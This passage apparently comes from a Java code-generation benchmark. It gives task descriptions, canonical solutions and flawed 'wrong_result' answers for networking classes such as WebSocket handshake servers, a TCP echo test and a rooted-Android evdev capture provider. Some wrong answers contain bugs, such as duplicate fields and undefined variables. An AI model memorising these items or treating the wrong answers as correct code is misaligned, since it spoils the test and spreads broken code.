    "Instruction": "Task Description: Create a WebSocket server class in Java that handles WebSocket connections, performs WebSocket handshake, and sends binary frames to clients.\n\nClass Description: The WebSocketServer class implements a basic WebSocket server that listens for incoming connections, performs the WebSocket handshake protocol, and sends binary data frames to connected clients. It supports configurable masking and frame size.\n\nAttributes:\n- serverSocket: ServerSocket - The server socket used to listen for incoming connections\n- port: int - The port number on which the server listens for connections\n\nMethods:\n- WebSocketServer(int port) -> None - Constructor that initializes the server with the specified port number\n- start() -> void - Starts the server by creating and binding the server socket\n- handleConnection() -> void - Handles an incoming connection, performs WebSocket handshake, and sends binary frames\n- stop() -> void - Stops the server by closing the server socket\n\nThe class should:\n1. Accept incoming TCP connections\n2. Parse WebSocket handshake headers\n3. Generate proper handshake response\n4. Create and send binary frames with configurable masking and size\n5. Properly close connections and clean up resources",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.Scanner;\nimport org.java_websocket.util.Charsetfunctions;\nimport org.java_websocket.util.KeyUtils;\nimport org.java_websocket.drafts.Draft_6455;\nimport org.java_websocket.framing.BinaryFrame;\nimport java.nio.ByteBuffer;\n\npublic class WebSocketServer {\n\n    private ServerSocket serverSocket;\n    private int port;\n\n    public WebSocketServer(int port) {\n        this.port = port;\n    }\n\n    public void start() throws IOException {\n        serverSocket = new ServerSocket(port);\n        serverSocket.setReuseAddress(true);\n    }\n\n    public void handleConnection() throws IOException, InterruptedException {\n        Socket client = serverSocket.accept();\n        Scanner in = new Scanner(client.getInputStream());\n        String input;\n        String seckey = \"\";\n        String testCase;\n        boolean useMask = false;\n        int size = 0;\n        OutputStream os = client.getOutputStream();\n\n        while (in.hasNext()) {\n            input = in.nextLine();\n            if (input.startsWith(\"Sec-WebSocket-Key: \")) {\n                seckey = input.split(\" \")[1];\n            }\n            if (input.startsWith(\"Upgrade\")) {\n                os.write(Charsetfunctions.asciiBytes(\n                    \"HTTP/1.1 101 Websocket Connection Upgrade\\r\\nUpgrade: websocket\\r\\nConnection: Upgrade\\r\\n\"\n                        + KeyUtils.getSecKey(seckey) + \"\\r\\n\"));\n                os.flush();\n                Thread.sleep(10);\n                Draft_6455 draft_6455 = new Draft_6455();\n                BinaryFrame binaryFrame = new BinaryFrame();\n                binaryFrame.setPayload(ByteBuffer.allocate(size));\n                binaryFrame.setTransferemasked(useMask);\n                ByteBuffer byteBuffer = draft_6455.createBinaryFrame(binaryFrame);\n                byte[] bytes = byteBuffer.array();\n                int first = size / 2;\n                os.write(bytes, 0, first);\n                os.flush();\n                Thread.sleep(5);\n                os.write(bytes, first, bytes.length - first);\n                os.flush();\n                break;\n            }\n            if (input.startsWith(\"GET \")) {\n                testCase = input.split(\" \")[1];\n                String[] strings = testCase.split(\"/\");\n                useMask = Boolean.valueOf(strings[1]);\n                size = Integer.valueOf(strings[2]);\n            }\n        }\n        client.close();\n    }\n\n    public void stop() throws IOException {\n        serverSocket.close();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class WebSocketServer {\n    private ServerSocket serverSocket;\n    private int port;\n    private boolean maskingEnabled = true;\n    private int frameSize = 1024;\n\n    public WebSocketServer(int port) {\n        this.port = port;\n    }\n\n    public void start() {\n        try {\n            serverSocket = new ServerSocket(port);\n            System.out.println(\"WebSocket server started on port \" + port);\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                new Thread(() -> handleConnection(clientSocket)).start();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void handleConnection(Socket clientSocket) {\n        try {\n            InputStream input = clientSocket.getInputStream();\n            OutputStream output = clientSocket.getOutputStream();\n\n            StringBuilder request = new StringBuilder();\n            String line;\n            while ((line = readLine(input)) != null && !line.isEmpty()) {\n                request.append(line).append(\"\\r\\n\");\n            }\n\n            String[] headers = request.toString().split(\"\\r\\n\");\n            String upgradeHeader = null;\n            String connectionHeader = null;\n            String secWebSocketKey = null;\n            for (String header : headers) {\n                if (header.startsWith(\"Upgrade:\")) {\n                    upgradeHeader = header.split(\":\")[1].trim();\n                } else if (header.startsWith(\"Connection:\")) {\n                    connectionHeader = header.split(\":\")[1].trim();\n                } else if (header.startsWith(\"Sec-WebSocket-Key:\")) {\n                    secWebSocketKey = header.split(\":\")[1].trim();\n                }\n            }\n\n            if (!upgradeHeader.equals(\"websocket\") || !connectionHeader.equals(\"Upgrade\")) {\n                System.out.println(\"Invalid handshake request\");\n                clientSocket.close();\n                return;\n            }\n\n            String key = secWebSocketKey + \"258EAFA5-E914-47DA-95CA-D56F7C4A7888\";\n            MessageDigest digest = MessageDigest.getInstance(\"SHA-1\");\n            byte[] hash = digest.digest(key.getBytes());\n            String accept = Base64.getEncoder().encodeToString(hash);\n\n            String response = \"HTTP/1.1 101 Switching Protocols\\r\\n\" +\n                    \"Upgrade: websocket\\r\\n\" +\n                    \"Connection: Upgrade\\r\\n\" +\n                    \"Sec-WebSocket-Accept: \" + accept + \"\\r\\n\\r\\n\";\n            output.write(response.getBytes());\n\n            byte[] payload = new byte[frameSize];\n            for (int i = 0; i < payload.length; i++) {\n                payload[i] = (byte) i;\n            }\n\n            if (maskingEnabled) {\n                byte[] mask = new byte[4];\n                new Random().nextBytes(mask);\n                for (int i = 0; i < payload.length; i++) {\n                    payload[i] ^= mask[i % 4];\n                }\n            }\n\n            byte[] header = new byte[2];\n            header[0] = (byte) 0x82;\n            header[1] = (byte) payload.length;\n\n            output.write(header);\n            output.write(payload);\n            output.flush();\n\n            clientSocket.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private String readLine(InputStream input) throws IOException {\n        StringBuilder line = new StringBuilder();\n        int ch;\n        while ((ch = input.read()) != -1) {\n            if (ch == '\\r') {\n                continue;\n            } else if (ch == '\\n') {\n                break;\n            } else {\n                line.append((char) ch);\n            }\n        }\n        return line.toString();\n    }\n\n    public void stop() {\n        try {\n            if (serverSocket != null) {\n                serverSocket.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}"
  },
  {
    "Task_id": 533,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using ServerSocket to handle client connections, process incoming requests, and send responses. The server should integrate with Eureka service discovery and manage its lifecycle through initialization and cleanup.\n\nClass Description: ExampleServiceBase is a singleton class that acts as a TCP server, listening on a specified port for client connections. It processes incoming requests by reading input from clients and sending back responses with a timestamp. The class integrates with Eureka service discovery to register its availability.\n\nAttributes:\n- applicationInfoManager: [ApplicationInfoManager] - Manages the service instance information for Eureka registration\n- eurekaClient: [EurekaClient] - Handles communication with the Eureka service discovery server\n\nMethods:\n- ExampleServiceBase([ApplicationInfoManager, EurekaClient]) -> [void] - Constructor that initializes the Eureka-related dependencies\n- start() -> [void] - Initializes the service by setting its status to UP in Eureka and starts listening for client connections on the registered port\n- processRequest([Socket]) -> [void] - Processes an incoming client connection by reading the request, generating a response with current timestamp, and sending it back to the client",
    "Canonical_solution": "import com.netflix.appinfo.ApplicationInfoManager;\nimport com.netflix.appinfo.InstanceInfo;\nimport com.netflix.discovery.EurekaClient;\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.PrintStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.Date;\n\n@Singleton\npublic class ExampleServiceBase {\n\n    private final ApplicationInfoManager applicationInfoManager;\n    private final EurekaClient eurekaClient;\n\n    @Inject\n    public ExampleServiceBase(ApplicationInfoManager applicationInfoManager,\n                            EurekaClient eurekaClient) {\n        this.applicationInfoManager = applicationInfoManager;\n        this.eurekaClient = eurekaClient;\n    }\n\n    @PostConstruct\n    public void start() {\n        applicationInfoManager.setInstanceStatus(InstanceInfo.InstanceStatus.UP);\n        \n        try {\n            int myServingPort = applicationInfoManager.getInfo().getPort();\n            ServerSocket serverSocket = new ServerSocket(myServingPort);\n            final Socket s = serverSocket.accept();\n            processRequest(s);\n\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void processRequest(final Socket s) {\n        try {\n            BufferedReader rd = new BufferedReader(new InputStreamReader(s.getInputStream()));\n            String line = rd.readLine();\n            if (line != null) {\n                System.out.println(\"Received a request from the example client: \" + line);\n            }\n            String response = \"BAR \" + new Date();\n            System.out.println(\"Sending the response to the client: \" + response);\n\n            PrintStream out = new PrintStream(s.getOutputStream());\n            out.println(response);\n\n        } catch (Throwable e) {\n            System.err.println(\"Error processing requests\");\n        } finally {\n            if (s != null) {\n                try {\n                    s.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class ExampleServiceBase {\n    private static ExampleServiceBase instance;\n    private ApplicationInfoManager applicationInfoManager;\n    private EurekaClient eurekaClient;\n    private ServerSocket serverSocket;\n\n    private ExampleServiceBase(ApplicationInfoManager appInfo, EurekaClient eurekaClient) {\n        this.applicationInfoManager = appInfo;\n        this.eurekaClient = eurekaClient;\n    }\n\n    public static ExampleServiceBase getInstance(ApplicationInfoManager appInfo, EurekaClient eurekaClient) {\n        if (instance == null) {\n            instance = new ExampleServiceBase(appInfo, eurekaClient);\n        }\n        return instance;\n    }\n\n    public void start() {\n        applicationInfoManager.setInstanceStatus(InstanceStatus.UP);\n        int port = applicationInfoManager.getApplicationInfo().getLeaseInfo().getPort();\n        try {\n            serverSocket = new ServerSocket(port);\n            System.out.println(\"Server started on port \" + port);\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                processRequest(clientSocket);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void processRequest(Socket socket) {\n        try {\n            InputStream input = socket.getInputStream();\n            OutputStream output = socket.getOutputStream();\n            BufferedReader reader = new BufferedReader(new InputStreamReader(input));\n            String request = reader.readLine();\n            long timestamp = System.currentTimeMillis();\n            String response = \"Timestamp: \" + timestamp;\n            output.write(response.getBytes());\n            output.flush();\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}"
  },
  {
    "Task_id": 534,
    "Instruction": "Task Description: Implement a WebSocket handshake server in Java that handles various test cases for WebSocket connection upgrades. The server should listen on a specified port, accept client connections, and respond with different HTTP responses based on the requested test case.\n\nClass Description: WebSocketHandshakeServer is a TCP server that simulates WebSocket handshake responses for testing purposes. It creates a ServerSocket to listen for incoming connections and handles each client connection in a separate thread, responding with different HTTP responses based on the requested test case path.\n\nAttributes:\n- serverSocket: ServerSocket - The server socket that listens for incoming client connections\n- port: int - The port number on which the server listens for connections\n- additionalHandshake: String - Constant string containing additional handshake headers required for WebSocket upgrade\n\nMethods:\n- WebSocketHandshakeServer(int port) -> None - Constructor that initializes the server with the specified port number\n- start() -> void - Starts the server, creates a ServerSocket, and begins accepting client connections in a new thread\n- stop() -> void - Stops the server by closing the ServerSocket if it's open\n- handleClientConnection(Socket client) -> void - Handles an individual client connection, reads the request, and sends the appropriate response based on the test case\n- asciiBytes(String input) -> byte[] - Helper method that converts a string to ASCII bytes for network transmission",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.Scanner;\n\npublic class WebSocketHandshakeServer {\n\n    private static final String additionalHandshake = \"Upgrade: websocket\\r\\nConnection: Upgrade\\r\\n\\r\\n\";\n    private ServerSocket serverSocket;\n    private int port;\n\n    public WebSocketHandshakeServer(int port) {\n        this.port = port;\n    }\n\n    public void start() throws IOException {\n        serverSocket = new ServerSocket(port);\n        serverSocket.setReuseAddress(true);\n        \n        new Thread(() -> {\n            while (!serverSocket.isClosed()) {\n                try {\n                    Socket client = serverSocket.accept();\n                    handleClientConnection(client);\n                } catch (IOException e) {\n                    if (!serverSocket.isClosed()) {\n                        e.printStackTrace();\n                    }\n                }\n            }\n        }).start();\n    }\n\n    private void handleClientConnection(Socket client) throws IOException {\n        try (Scanner in = new Scanner(client.getInputStream());\n             OutputStream os = client.getOutputStream()) {\n            \n            String input = in.nextLine();\n            String testCase = input.split(\" \")[1];\n            \n            switch (testCase) {\n                case \"/0\":\n                    os.write(asciiBytes(\"HTTP/1.1 100 Switching Protocols\\r\\n\" + additionalHandshake));\n                    break;\n                case \"/1\":\n                    os.write(asciiBytes(\"HTTP/1.0 100 Switching Protocols\\r\\n\" + additionalHandshake));\n                    break;\n                case \"/2\":\n                    os.write(asciiBytes(\"HTTP 100 Switching Protocols\\r\\n\" + additionalHandshake));\n                    break;\n                case \"/3\":\n                    os.write(asciiBytes(\"HTTP/1.1 200 Switching Protocols\\r\\n\" + additionalHandshake));\n                    break;\n                case \"/4\":\n                    os.write(asciiBytes(\"HTTP 101 Switching Protocols\\r\\n\" + additionalHandshake));\n                    break;\n                case \"/5\":\n                    os.write(asciiBytes(\"HTTP/1.1 404 Switching Protocols\\r\\n\" + additionalHandshake));\n                    break;\n                case \"/6\":\n                    os.write(asciiBytes(\"HTTP/2.0 404 Switching Protocols\\r\\n\" + additionalHandshake));\n                    break;\n                case \"/7\":\n                    os.write(asciiBytes(\"HTTP/1.1 500 Switching Protocols\\r\\n\" + additionalHandshake));\n                    break;\n                case \"/8\":\n                    os.write(asciiBytes(\"GET 302 Switching Protocols\\r\\n\" + additionalHandshake));\n                    break;\n                case \"/9\":\n                    os.write(asciiBytes(\"GET HTTP/1.1 101 Switching Protocols\\r\\n\" + additionalHandshake));\n                    break;\n                case \"/10\":\n                    os.write(asciiBytes(\"HTTP/1.1 101 Switching Protocols\\r\\n\" + additionalHandshake));\n                    break;\n                case \"/11\":\n                    os.write(asciiBytes(\"HTTP/1.1 101 Websocket Connection Upgrade\\r\\n\" + additionalHandshake));\n                    break;\n            }\n            os.flush();\n        } finally {\n            client.close();\n        }\n    }\n\n    public void stop() throws IOException {\n        if (serverSocket != null && !serverSocket.isClosed()) {\n            serverSocket.close();\n        }\n    }\n\n    private byte[] asciiBytes(String input) {\n        return input.getBytes(java.nio.charset.StandardCharsets.US_ASCII);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "import java.io.*;\nimport java.net.*;\nimport java.nio.charset.StandardCharsets;\n\npublic class WebSocketHandshakeServer {\n    private ServerSocket serverSocket;\n    private int port;\n    private final String additionalHandshake;\n\n    public WebSocketHandshakeServer(int port) {\n        this.port = port;\n        this.additionalHandshake = \"Custom-Header: value\\r\\n\";\n    }\n\n    public void start() {\n        try {\n            serverSocket = new ServerSocket(port);\n            new Thread(() -> {\n                while (true) {\n                    try {\n                        Socket client = serverSocket.accept();\n                        handleClientConnection(client);\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                }\n            }).start();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void stop() {\n        if (serverSocket != null && !serverSocket.isClosed()) {\n            try {\n                serverSocket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private void handleClientConnection(Socket client) {\n        try (InputStream input = client.getInputStream();\n             OutputStream output = client.getOutputStream()) {\n            byte[] buffer = new byte[1024];\n            int bytesRead = input.read(buffer);\n            String request = new String(buffer, 0, bytesRead);\n            String[] parts = request.split(\"\\r\\n\");\n            String requestLine = parts[0];\n            String[] tokens = requestLine.split(\" \");\n            String method = tokens[0];\n            String path = tokens[1];\n            String httpVersion = tokens[2];\n\n            String response = \"\";\n            if (path.equals(\"/test1\")) {\n                response = \"HTTP/1.1 101 Switching Protocols\\r\\n\" +\n                           \"Upgrade: websocket\\r\\n\" +\n                           \"Connection: Upgrade\\r\\n\" +\n                           \"Sec-WebSocket-Accept: dGhlhGQ=\\r\\n\" +\n                           additionalHandshake +\n                           \"\\r\\n\";\n            } else if (path.equals(\"/test2\")) {\n                response = \"HTTP/1.1 400 Bad Request\\r\\n\" +\n                           \"Content-Type: text/plain\\r\\n\" +\n                           \"Content-Length: 13\\r\\n\" +\n                           \"\\r\\n\" +\n                           \"Bad Request\";\n            } else {\n                response = \"HTTP/1.1 404 Not Found\\r\\n\" +\n                           \"Content-Type: text/plain\\r\\n\" +\n                           \"Content-Length: 9\\r\\n\" +\n                           \"\\r\\n\" +\n                           \"Not Found\";\n            }\n\n            output.write(asciiBytes(response));\n            output.flush();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private byte[] asciiBytes(String input) {\n        return input.getBytes(StandardCharsets.US_ASCII);\n    }\n\n    public static void main(String[] args) {\n        WebSocketHandshakeServer server = new WebSocketHandshakeServer(8080);\n        server.start();\n    }\n}"
  },
  {
    "Task_id": 535,
    "Instruction": "Task Description: Implement an Android input capture provider that uses TCP socket communication to interface with a native evdev reader process for handling input events from rooted devices.\n\nClass Description: EvdevCaptureProvider is an Android input capture implementation that establishes a TCP server to communicate with a native evdev reader process running with root privileges. It handles input event capture and forwarding while managing the lifecycle of the socket connection and root process.\n\nAttributes:\n- listener: [EvdevListener] - Callback interface for handling input events\n- libraryPath: [String] - Path to the native library directory\n- shutdown: [boolean] - Flag indicating whether the provider should terminate\n- evdevIn: [InputStream] - Input stream from the evdev reader socket\n- evdevOut: [OutputStream] - Output stream to the evdev reader socket\n- su: [Process] - Root process running the evdev reader\n- servSock: [ServerSocket] - TCP server socket for accepting connections\n- evdevSock: [Socket] - Socket connection to the evdev reader\n- activity: [Activity] - Android activity context\n- started: [boolean] - Flag indicating if the provider has started\n- handlerThread: [Thread] - Thread handling the socket communication\n\nMethods:\n- EvdevCaptureProvider([Activity activity, EvdevListener listener]) -> [void] - Constructor that initializes the capture provider with activity context and event listener\n- destroy() -> [void] - Cleans up resources including sockets, streams, and terminates the root process\n- reportDeviceNotRooted() -> [void] - Displays a toast message when the device isn't rooted (private helper method)\n- run() -> [void] - Thread implementation that establishes the server socket, launches the root process, and handles event reading (inner Thread class method)",
    "Canonical_solution": "import android.app.Activity;\nimport android.os.Build;\nimport android.os.Looper;\nimport android.widget.Toast;\n\nimport com.limelight.LimeLog;\nimport com.limelight.binding.input.capture.InputCaptureProvider;\n\nimport java.io.DataOutputStream;\nimport java.io.File;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class EvdevCaptureProvider extends InputCaptureProvider {\n\n    private final EvdevListener listener;\n    private final String libraryPath;\n\n    private boolean shutdown = false;\n    private InputStream evdevIn;\n    private OutputStream evdevOut;\n    private Process su;\n    private ServerSocket servSock;\n    private Socket evdevSock;\n    private Activity activity;\n    private boolean started = false;\n\n    private static final byte UNGRAB_REQUEST = 1;\n    private static final byte REGRAB_REQUEST = 2;\n\n    private final Thread handlerThread = new Thread() {\n        @Override\n        public void run() {\n            try {\n                servSock = new ServerSocket(0, 1);\n            } catch (IOException e) {\n                e.printStackTrace();\n                return;\n            }\n\n            final String evdevReaderCmd = libraryPath+File.separatorChar+\"libevdev_reader.so \"+servSock.getLocalPort();\n\n            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {\n                try {\n                    su = new ProcessBuilder(\"su\", \"-c\", evdevReaderCmd).start();\n                } catch (IOException e) {\n                    reportDeviceNotRooted();\n                    e.printStackTrace();\n                    return;\n                }\n            }\n            else {\n                ProcessBuilder builder = new ProcessBuilder(\"su\");\n                builder.redirectErrorStream(true);\n\n                try {\n                    su = builder.start();\n                } catch (IOException e) {\n                    reportDeviceNotRooted();\n                    e.printStackTrace();\n                    return;\n                }\n\n                DataOutputStream suOut = new DataOutputStream(su.getOutputStream());\n                try {\n                    suOut.writeChars(evdevReaderCmd+\"\\n\");\n                } catch (IOException e) {\n                    reportDeviceNotRooted();\n                    e.printStackTrace();\n                    return;\n                }\n            }\n\n            LimeLog.info(\"Waiting for EvdevReader connection to port \"+servSock.getLocalPort());\n            try {\n                evdevSock = servSock.accept();\n                evdevIn = evdevSock.getInputStream();\n                evdevOut = evdevSock.getOutputStream();\n            } catch (IOException e) {\n                e.printStackTrace();\n                return;\n            }\n            LimeLog.info(\"EvdevReader connected from port \"+evdevSock.getPort());\n\n            while (!isInterrupted() && !shutdown) {\n                EvdevEvent event;\n                try {\n                    event = EvdevReader.read(evdevIn);\n                } catch (IOException e) {\n                    event = null;\n                }\n                if (event == null) {\n                    break;\n                }\n            }\n        }\n    };\n\n    public EvdevCaptureProvider(Activity activity, EvdevListener listener) {\n        this.listener = listener;\n        this.activity = activity;\n        this.libraryPath = activity.getApplicationInfo().nativeLibraryDir;\n    }\n\n    private void reportDeviceNotRooted() {\n        activity.runOnUiThread(new Runnable() {\n            @Override\n            public void run() {\n                Toast.makeText(activity, \"This device is not rooted - Mouse capture is unavailable\", Toast.LENGTH_LONG).show();\n            }\n        });\n    }\n\n    @Override\n    public void destroy() {\n        if (!started) {\n            return;\n        }\n\n        shutdown = true;\n        handlerThread.interrupt();\n\n        if (servSock != null) {\n            try {\n                servSock.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n\n        if (evdevSock != null) {\n            try {\n                evdevSock.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n\n        if (evdevIn != null) {\n            try {\n                evdevIn.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n\n        if (evdevOut != null) {\n            try {\n                evdevOut.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n\n        if (su != null) {\n            su.destroy();\n        }\n\n        try {\n            handlerThread.join();\n        } catch (InterruptedException ignored) {}\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class EvdevCaptureProvider implements Runnable {\n    private Activity activity;\n    private EvdevListener listener;\n    private boolean shutdown;\n    private InputStream evdevIn;\n    private OutputStream evdevOut;\n    private Process su;\n    private ServerSocket servSock;\n    private Socket evdevSock;\n    private Activity activity;\n    private boolean started;\n    private Thread handlerThread;\n\n    public EvdevCaptureProvider(Activity activity, EvdevListener listener) {\n        this.activity = activity;\n        this.listener = listener;\n        if (!isRooted()) {\n            reportDeviceNotRooted();\n        }\n        shutdown = false;\n        started = false;\n        handlerThread = new Thread(this);\n    }\n\n    public void destroy() {\n        shutdown = true;\n        handlerThread.interrupt();\n        try {\n            if (evdevIn != null) evdevIn.close();\n            if (evdevOut != null) evdevOut.close();\n            if (evdevSock != null) evdevSock.close();\n            if (servSock != null) servSock.close();\n            if (su != null) su.destroy();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void reportDeviceNotRooted() {\n        Toast.makeText(activity, \"Device not rooted\", Toast.LENGTH_SHORT).show();\n    }\n\n    private boolean isRooted() {\n        try {\n            Process process = Runtime.getRuntime().exec(\"su\");\n            process.waitFor();\n            return process.exitValue() == 0;\n        } catch (Exception e) {\n            return false;\n        }\n    }\n\n    public void run() {\n        try {\n            servSock = new ServerSocket(9999);\n            ProcessBuilder pb = new ProcessBuilder(\"su\", \"-c\", libraryPath + \"/evdev_reader\");\n            su = pb.start();\n            evdevSock = servSock.accept();\n            evdevIn = evdevSock.getInputStream();\n            evdevOut = evdevSock.getOutputStream();\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while (!shutdown) {\n                bytesRead = evdevIn.read(buffer);\n                if (bytesRead > 0) {\n                    listener.onEvent(buffer, bytesRead);\n                }\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            destroy();\n        }\n    }\n}"
  },
  {
    "Task_id": 536,
    "Instruction": "Task Description: Demonstrate basic TCP socket communication between a server and client using Java's ServerSocket and Socket classes. The server should echo back any data received from the client.\n\nFunction Description: The function establishes a TCP server that listens on port 5678, accepts a client connection, reads data from the client, writes the same data back (echo), and then closes the connection. Simultaneously, it creates a client that connects to this server, sends a test message, and verifies the echoed response.\n\nInput: None (The function uses hardcoded values for demonstration purposes)\n\nOutput: None (The function performs communication internally and handles errors through fail() calls)\n\n---\n\nNote: Since the reference code shows a complete test scenario (both server and client) implemented as a single function with internal threading rather than separate reusable components, I've described it at the function level. If you'd prefer this to be split into proper class definitions for Server and Client components, please let me know and I can provide that alternative structure instead.",
    "Canonical_solution": "import java.net.ServerSocket;\nimport java.net.Socket;\nimport java.net.InetSocketAddress;\nimport java.io.InputStream;\nimport java.io.OutputStream;\n\npublic void testServerSocketCommunication() {\n    Thread listener = new Thread(new Runnable() {\n        @Override\n        public void run() {\n            ServerSocket s = null;\n            try {\n                s = new ServerSocket(5678);\n            } catch (IOException e) {\n                fail(\"exception creating ServerSocket\");\n            }\n\n            byte[] recv = new byte[800];\n\n            Socket peer = null;\n            try {\n                peer = s.accept();\n            } catch (IOException e) {\n                fail(\"accept failed\");\n            }\n\n            InputStream is = peer.getInputStream();\n            OutputStream os = peer.getOutputStream();\n\n            int recvLen = 0;\n            try {\n                recvLen = is.read(recv);\n            } catch (IOException e) {\n                fail(\"read failed\");\n            }\n\n            try {\n                os.write(recv, 0, recvLen);\n            } catch (IOException e) {\n                fail(\"write failed\");\n            }\n\n            try {\n                peer.close();\n                s.close();\n            } catch (IOException e) {\n                fail(\"close failed\");\n            }\n        }\n    });\n    listener.start();\n\n    Socket s = null;\n    try {\n        s = new Socket();\n        s.bind(new InetSocketAddress(\"192.168.0.3\", 0));\n    } catch (IOException e) {\n        fail(\"new socket failed\");\n    }\n\n    try {\n        s.connect(new InetSocketAddress(\"192.168.0.3\", 5678));\n    } catch (IOException e) {\n        fail(\"connect failed\");\n    }\n\n    byte[] send = \"Hello, World!\".getBytes();\n    InputStream is = s.getInputStream();\n    OutputStream os = s.getOutputStream();\n\n    try {\n        os.write(send);\n    } catch (IOException e) {\n        fail(\"exception sending on Socket\");\n    }\n\n    byte[] recv = new byte[800];\n    int recvLen = 0;\n    try {\n        recvLen = is.read(recv);\n    } catch (IOException e) {\n        fail(\"exception receiving on DatagramSocket\");\n    }\n\n    try {\n        listener.join();\n    } catch (InterruptedException e) {\n    }\n\n    try {\n        s.close();\n    } catch (IOException e) {\n        fail(\"close failed\");\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 0,
    "wrong_result": "public void testTCPCommunication() {\n    Thread serverThread = new Thread(() -> {\n        try (ServerSocket serverSocket = new ServerSocket(5678)) {\n            System.out.println(\"Server started, waiting for client...\");\n            Socket clientSocket = serverSocket.accept();\n            System.out.println(\"Client connected.\");\n            BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n            String inputLine = in.readLine();\n            System.out.println(\"Received: \" + inputLine);\n            PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n            out.println(inputLine);\n            clientSocket.close();\n        } catch (IOException e) {\n            fail(\"Server error: \" + e.getMessage());\n        }\n    });\n\n    Thread clientThread = new Thread(() -> {\n        try (Socket socket = new Socket(\"localhost\", 5678)) {\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n            out.println(\"Hello, Server!\");\n            System.out.println(\"Sent: Hello, Server!\");\n            String response = in.readLine();\n            System.out.println(\"Received: \" + response);\n            if (!response.equals(\"Hello, Server!\")) {\n                fail(\"Echo mismatch: expected 'Hello, Server!', got '\" + response + \"'\");\n            }\n        } catch (IOException e) {\n            fail(\"Client error: \" + e.getMessage());\n        }\n    });\n\n    serverThread.start();\n    clientThread.start();\n\n    try {\n        serverThread.join();\n        clientThread.join();\n    } catch (InterruptedException e) {\n        fail(\"Join interrupted: \" + e.getMessage());\n    }\n}"
  },
  {
    "Task_id": 537,
    "Instruction": "Task Description: Implement a simple HTTP server class that listens for incoming client connections on a dynamically assigned port and responds with a \"Not Implemented\" HTTP status. The server should be able to handle basic client requests and clean up resources properly when closed.\n\nClass Description: The HTTPServer class implements a basic HTTP server using Java's ServerSocket. It runs in a separate thread to handle incoming connections and responds with a fixed HTTP 501 response. The class implements AutoCloseable for proper resource management.\n\nAttributes:\n- server: [ServerSocket] - The underlying ServerSocket instance that listens for incoming connections\n- thread: [Thread] - The thread in which the server runs to handle client connections asynchronously\n\nMethods:\n- HTTPServer() throws [IOException] -> [void] - Constructor that initializes the ServerSocket on a random available port and starts the server thread\n- port() -> [int] - Returns the local port number on which the server is listening\n- serve() -> [void] - Private method that handles incoming client connections and sends HTTP responses (runs in the server thread)\n- close() throws [Exception] -> [void] - Closes the server socket and waits for the server thread to terminate (implements AutoCloseable)",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.net.SocketException;\nimport java.nio.charset.StandardCharsets;\n\npublic class HTTPServer implements AutoCloseable {\n    private final ServerSocket server;\n    private final Thread thread;\n\n    public HTTPServer() throws IOException {\n        server = new ServerSocket(0, 1);\n        thread = new Thread(new Runnable() {\n            @Override public void run() {\n                serve();\n            }\n        });\n        thread.start();\n    }\n\n    public final int port() {\n        return server.getLocalPort();\n    }\n\n    private void serve() {\n        try {\n            Socket client = server.accept();\n\n            try (InputStream inputStream = client.getInputStream()) {\n                while (inputStream.available() > 0) {\n                    if (inputStream.read() == -1) {\n                        break;\n                    }\n                }\n\n                try (OutputStream outputStream = client.getOutputStream()) {\n                    outputStream.write(\"HTTP/1.0 501 Not Implemented\\r\\n\\r\\n\".getBytes(StandardCharsets.UTF_8));\n                }\n            }\n        }\n        catch (IOException e) {\n            if (server.isClosed() && e instanceof SocketException) {\n                return;\n            }\n            throw new RuntimeException(e);\n        }\n    }\n\n    @Override public void close() throws Exception {\n        server.close();\n        thread.join();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
